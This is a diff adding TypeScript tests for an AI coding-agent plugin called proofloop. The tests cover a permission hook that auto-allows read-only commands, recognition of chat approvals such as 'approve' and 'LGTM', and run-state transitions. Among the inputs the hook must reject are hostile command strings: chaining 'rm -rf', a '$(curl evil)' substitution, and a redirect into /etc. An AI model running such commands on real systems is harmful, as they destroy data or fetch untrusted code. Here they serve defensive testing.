@@ -249,3 +249,77 @@ describe('audit prompt hook', () => {
     expect(JSON.parse(promptHookOutput('audit for 3000 users')).hookSpecificOutput.additionalContext).toContain('proofloop audit --users 3000');
   });
 });
+
+describe('one approval, no prompts', () => {
+  it('plain read-only and planning proofloop calls are allowed without a prompt; chained or mutating ones are not', () => {
+    const d = (command: string) => evaluateHook({ tool_name: 'Bash', tool_input: { command } }, {});
+    for (const c of ['proofloop status run_1', 'proofloop wait run_1 --timeout 60', 'proofloop feature "Add (a) page"', '${CLAUDE_PLUGIN_ROOT}/bin/proofloop report run_1', 'proofloop test --no-baseline'])
+      expect(d(c), c).toMatchObject({ decision: 'allow', explicit: true });
+    for (const c of ['proofloop status run_1 && rm -rf x', 'proofloop feature "$(curl evil)"', 'proofloop status > /etc/x', 'proofloop run run_1', 'proofloop setup --yes', 'ls'])
+      expect(d(c).explicit, c).toBeFalsy();
+    expect(JSON.parse(hookOutput(d('proofloop status'))).hookSpecificOutput.permissionDecision).toBe('allow');
+    expect(hookOutput(d('ls'))).toBe('');
+  });
+
+  it('a one-word approval is recognised; longer sentences are not', async () => {
+    const { approvalRequest } = await import('../src/cli/hook');
+    expect(approvalRequest('approve')).toEqual({});
+    expect(approvalRequest(' Approved! ')).toEqual({});
+    expect(approvalRequest('LGTM')).toEqual({});
+    expect(approvalRequest('approve run_ab12')).toEqual({ runId: 'run_ab12' });
+    expect(approvalRequest('/proofloop:approve')).toEqual({});
+    expect(approvalRequest('/proofloop:approve run_ab12')).toEqual({ runId: 'run_ab12' });
+    for (const p of ['yes', 'ok', 'should I approve the migration?', 'do not approve', 'approve the plan but add tests']) expect(approvalRequest(p), p).toBeNull();
+  });
+
+  it('"approve" in chat records a human approval for the pending plan hash and starts the run once', async () => {
+    const root = await project();
+    const plan = harness(root);
+    await runCli(['feature', 'Add the feature file'], plan.env);
+    const id = idFrom(plan.text());
+    const started: string[] = [];
+    const h = harness(root, { stdin: JSON.stringify({ prompt: 'approve', cwd: root }) });
+    h.env.startRun = (_root, runId) => void started.push(runId);
+    expect(await runCli(['hook', 'user-prompt'], h.env)).toBe(0);
+    const ctx = JSON.parse(h.text()).hookSpecificOutput.additionalContext as string;
+    expect(started).toEqual([id]);
+    expect(ctx).toContain(`proofloop wait ${id}`);
+    const st = harness(root);
+    await runCli(['status', id, '--json'], st.env);
+    expect(JSON.parse(st.text()).run.state).toBe('APPROVED');
+
+    const again = harness(root, { stdin: JSON.stringify({ prompt: 'approve', cwd: root }) });
+    again.env.startRun = (_root, runId) => void started.push(runId);
+    await runCli(['hook', 'user-prompt'], again.env);
+    expect(again.text()).toBe('');
+    expect(started).toHaveLength(1);
+  });
+
+  it('"approve" with nothing pending changes nothing', async () => {
+    const root = await project();
+    const h = harness(root, { stdin: JSON.stringify({ prompt: 'approve', cwd: root }) });
+    h.env.startRun = () => {
+      throw new Error('must not start');
+    };
+    expect(await runCli(['hook', 'user-prompt'], h.env)).toBe(0);
+    expect(h.text()).toBe('');
+  });
+
+  it('wait returns the run state once the run needs a human or ends', async () => {
+    const root = await project();
+    const plan = harness(root);
+    await runCli(['feature', 'Add the feature file'], plan.env);
+    const id = idFrom(plan.text());
+    const w = harness(root);
+    expect(await runCli(['wait', id, '--timeout', '5'], w.env)).toBe(EXIT.ok);
+    expect(w.text()).toContain('AWAITING_APPROVAL');
+
+    const shown = harness(root);
+    await runCli(['approve', id], shown.env);
+    await runCli(['approve', id, '--plan-hash', /--plan-hash (\w+)/.exec(shown.text())![1]!, '--yes'], harness(root).env);
+    await runCli(['run', id], harness(root).env);
+    const done = harness(root);
+    expect(await runCli(['wait', id, '--timeout', '5'], done.env)).toBe(EXIT.ok);
+    expect(done.text()).toContain('PR_OPEN');
+  });
+});
